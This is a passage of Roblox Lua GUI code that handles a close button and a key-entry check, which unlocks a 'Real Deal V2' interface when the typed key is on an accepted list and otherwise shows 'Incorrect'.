	end)
	
	close.MouseButton1Down:Connect(function()
		toggled = false
		canvasGroup.Visible = false
	end)
	
	textButton.MouseButton1Down:Connect(function()
		local inputKey = textBox.Text
		if script:GetAttribute("what") == false then
		if table.find(lowerkeys, string.lower(inputKey)) then
			gui.Parent = player:WaitForChild("PlayerGui"):WaitForChild("Real Deal V2")
			canvasGroup.Visible = false
			toggled = false
			gui.Parent = script.Parent:WaitForChild("Main"):WaitForChild("CanvasGroup"):WaitForChild("THETABS")
			script:SetAttribute("what",true)
		else
			textBox.Text = "Incorrect"
			textBox.TextColor3 = Color3.fromRGB(255, 0, 0)
			wait(1)
			textBox.Text = ""
			textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
		end
		end
	end)
	
end;
task.spawn(C_1e2);

return G2L["1"], require;
